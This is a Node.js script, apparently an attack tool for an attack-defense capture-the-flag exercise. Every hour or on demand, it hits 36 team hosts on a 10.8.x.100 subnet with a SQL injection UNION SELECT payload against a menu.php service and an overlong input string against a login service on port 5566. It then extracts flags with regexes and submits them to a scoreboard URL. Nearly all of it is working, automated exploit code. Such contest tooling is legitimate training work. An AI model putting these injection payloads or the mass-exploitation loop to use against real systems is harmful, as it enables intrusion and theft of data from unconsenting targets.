var http = require('http');
var net = require('net');
var colors = require('colors');
var exec = require('child_process').exec;
var schedule = require('node-schedule');
var program = require('commander');


// submit flag
var submit = function (flag) {
    var url = "http://people.cs.nctu.edu.tw/~hwcheng/NSFinal/process.php?ID=13&key=" + flag.toString();
    var req = http.request(url);
    req.on('error', function(e) {
      console.log('SUBMIT ERROR: '.red + e.message);
    });
    req.end();
}

var parseFlag = function (regex, data) {
    match = data.toString().match(regex);
    if (match) {
        var flag = match[1];
        return match[1];
    }
}


//
//  PMC Injection
//

// assembles injection code
var genInjectionCode = function (team) {
    return "http://10.8." + team.toString() + ".100:7788/menu.php/db/name/1'+UNION+SELECT+*+FROM+flag+UNION+SELECT+*+FROM+pm_list+WHERE+id='2";
}
// regex for flag scrawling
var regexPMCNameFlag = /\>(\d) (\w*)\<\/div\>/;

var attackPMC = function (team) {
    // console.log('ATTACKING: '.green + genInjectionCode(team));
    var req = http.request(genInjectionCode(team), function (res) {
        res.setEncoding('utf8');
        res.on('data', function (chunk) {
            match = chunk.toString().match(regexPMCNameFlag);
            if (match) {
                var flag = match[2];
                console.log('FLAG: '.yellow, team, flag);
                submit(flag);
            }
        });

    });
    req.on('error', function(e) {
      console.log('ERROR: '.red + e.message);
    });
    req.end();
}


//
//  SSP Login Attack
//


var regexSSPLoginFlag = /Exit\n#(\w+)/
var attackSSP = function (team) {
    var target = {
        port: 5566,
        host: '10.8.' + team.toString() + '.100'
    };

    var conn = net.connect(target, function () {
        conn.write('11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1\n3\n8\n');
    });

    conn.on('data', function(data) {
        result = parseFlag(regexSSPLoginFlag, data);
        if (result) {
            console.log('Flag: '.yellow, team, result);
            submit(result);
        }
    });

    conn.on('error', function(e) {
      console.log('ERROR: '.red + e.message);
    });
};

var attackAll = function () {
    console.log('====== START ATTACKING ====='.red);
    for (i = 0; i < 36; i++) {
        attackPMC(i);
        attackSSP(i);
    }
};

// main

program
    .version('0.0.1')
    .option('-n, --now', 'Attack all attack NOW!!')
    .parse(process.argv);

if (program.now) {
    attackAll();
} else {
    var rule = new schedule.RecurrenceRule();
    rule.minute = 0;
    var j = schedule.scheduleJob(rule, attackAll);
}
